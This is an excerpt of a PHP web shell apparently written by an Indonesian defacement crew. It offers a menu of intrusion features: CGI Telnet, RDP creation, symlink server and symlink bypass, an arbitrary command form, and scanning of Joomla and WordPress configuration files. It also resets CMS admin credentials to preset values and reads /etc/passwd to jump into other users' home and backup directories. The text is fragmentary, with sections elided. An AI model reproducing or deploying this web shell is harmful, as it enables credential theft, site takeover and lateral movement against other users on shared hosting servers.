...
echo "</td></tr>";
echo "</table><br>";
echo "<center>Thank's To : Tatsumi-Crew - KeceTEAM - Hunter Security Crew - Indonesia Freedom Security - CowoKerensTeam</center>";
...
<a href='?path=$path&tatsumi=cgi'>CGI Telnet</a>
<br><br>
<font color='pink'></font>
...
<a href='?path=$path&jancok=saltokuy'>Hostgator</a>
<a href='?path=$path&jancok=salto'>Domains</a>
<a href='?path=$path&tatsumi=crdp'>Create RDP</a>
<font color='pink'></font>
<a href='?path=$path&tatsumi=about'>About Me</a></br></br>
<font color='pink'></font>
...
echo "<div id='menu'><center>";
echo "</br></br>
    <a href='?path=$path&symlink=server'>Symlink Server</a></br>
    <a href='?path=$path&symlink=404'>Symlink 404</a></br></br>
    <a href='?path=$path&symlink=python'>Bypass Symlink Python</a></br></br>
    <a href='https://www.facebook.com/nako48'>Coded By Arvan Apriyana</a></b><br>";
...
elseif($_GET['jancok'] == 'saltokuy') {
if(isset($_POST['usernya'])) {
    $userr = $_POST['usernya'];
    echo "<center><br><form method='post' target='_blank' action='?path=/home/$userr/backupwordpress'> 
  ...
  echo'<center><br><form method="post">
    ...
    <input type="submit" name="gg" value="Submit" ></form>';
  }

  
  echo "<form method='post'>
  <input type='text' size='30' height='10' name='cmd' value='tar -zxvf '><input type='submit' name='do_cmd' value='Submit'>
  </form>";
  if($_POST['do_cmd']) {
      ...
      foreach($scan_conf as $file_conf) {
        ...
        if(preg_match("/JConfig|joomla/",$config)) {
          ...
          if($target == '') {
            ...
            $url_target = "Login => <a href='$target/wp-admin/theme-install.php' target='_blank'><u>$target/wp-admin/theme-install.php</u></a><br>";
          }
  ...
  echo "
    ...
    <input type='text' size='70' name='config_dir' value='$path/'><br>
    <input type='text' name='user_baru' value='arvanlove' placeholder='user_baru'><br>
    <input type='text' name='pass_baru' value='nakoyabuki' placeholder='pass_baru'><br>
    ...
    while($passwd = fgets($etc)) {
        if($passwd == '' || !$etc) {
            ...
            foreach($user_jumping[1] as $user_tatsumi_jump) {
                $user_jumping_dir = "/home/$user_tatsumi_jump/backupwordpress";
